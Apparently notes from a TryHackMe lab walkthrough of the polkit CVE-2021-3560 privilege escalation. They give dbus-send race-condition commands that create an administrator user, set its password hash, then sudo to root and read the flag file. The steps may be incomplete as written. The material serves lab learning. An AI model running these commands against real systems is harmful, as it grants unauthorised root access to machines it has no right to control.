# https://tryhackme.com/room/polkit

```bash
# https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/
# CVE-2021-3560
#
# This Priv Esc is a race condition exploit kills a dbus message to create a new unprivileged user quickly enough such that the user ID ends up being 0 (which is root) due to the cancellation but the unprivileged user (now priviledged) remains

# Time how long it takes to create a new user
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
# this displays the execution times... half the system time
# e.g. .009s / 2 = .005s

# Create password hash for new user
openssl passwd -6 Expl01ted
$6$yvmulXFNIk4OC5cl$58BUOpWPiCHOWAR2HRQJ/qNqx9dwKSgWDN3oCZTIicjXWawwoBwCWzu6sRZRHOuSbLXaH5KH2WqNa69xl7yup/

# GOAL: background the command and kill it before the average execution time (around half of the execution time)
# i.e. since our command ran for about .009s to .010s, we will sleep for around half that time and kill
# NOTE: it's very important this command is backgrounded as a job, so that it will be killed while it is running
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$yvmulXFNIk4OC5cl$58BUOpWPiCHOWAR2HRQJ/qNqx9dwKSgWDN3oCZTIicjXWawwoBwCWzu6sRZRHOuSbLXaH5KH2WqNa69xl7yup/' string:'Ask the pentester' & sleep 0.005s; kill $!

# Change to our new user
su attacker
// Expl01ted

# Optional: ensure we can't elevate without a password (default)
sudo -l

# Elevate with sudo
sudo -s
// Expl01ted

// root!
whoami
cat /root/root.txt
# We just priv esc'd root with a normal, unprileged user
```